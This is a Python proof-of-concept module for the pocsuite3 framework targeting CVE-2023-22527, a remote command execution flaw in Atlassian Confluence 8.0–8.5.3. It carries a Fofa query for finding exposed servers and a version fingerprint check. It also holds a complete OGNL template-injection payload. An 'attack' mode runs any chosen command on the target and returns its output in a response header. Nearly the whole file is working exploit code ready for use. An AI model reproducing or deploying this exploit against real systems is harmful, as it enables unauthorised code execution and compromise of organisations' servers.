# -*- coding:utf-8 -*-

from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, OptString

class DemoPOC(POCBase):
    vulID = "CVE-2023-22527"
    version ='1'
    author = ["LMX"]
    vulDate = "2023"
    createDate = "2024-3-22"
    updateDate = "2024-3-22"
    references =[]
    name ="Confluence命令执行漏洞"
    appPowerLink = ''
    appName = 'Confluence'
    appVersion = '>= v8.0 && <= v8.5.3'
    vulType = '命令执行'
    desc = '''
    Fofa: app="ATLASSIAN-Confluence"
    '''
    
    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):
        result ={}
        urlparts = self.url
        parts = urlparts.split('/')
        urlresult = '/'.join(parts[:3])
        url = str(urlresult) + '/template/aui/text-inline.vm'
        r1 = requests.get(url=urlresult+"/login.action",verify=False)
        if any(key in r1.text for key in ('8.0.0','8.0.1','8.0.2','8.0.3','8.0.4','8.1.0','8.1.1','8.1.2','8.1.3','8.1.4','8.2.0','8.2.1','8.2.2','8.2.3','8.3.0','8.3.1','8.3.2','8.4.0','8.4.1','8.4.2','8.5.0','8.5.1','8.5.3')):
            headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                        'Content-Type': 'application/x-www-form-urlencoded'
                        }
            payload = r'''label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))'''
            r = requests.post(url=url,headers=headers,data=payload,verify=False,timeout=5)
            cmd = r.headers.get("X-Cmd-Response")
            try:
                if r.status_code == 200 and 'uid' in cmd:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
            except Exception as e:
                pass
            return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result = {}
        cmd = self.get_option("command")
        urlparts = self.url
        parts = urlparts.split('/')
        urlresult = '/'.join(parts[:3])
        url = str(urlresult) + '/template/aui/text-inline.vm'
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded'
                    }
        payload = r'''label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))'''
        payload = payload.replace("id",cmd)
        r = requests.post(url=url,headers=headers,data=payload,verify=False,timeout=5)
        cmdresult = r.headers.get("X-Cmd-Response")
        try:
            if r.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['CMD'] = cmdresult
        except Exception as e:
            pass
        return self.parse_output(result)
        
register_poc(DemoPOC) 
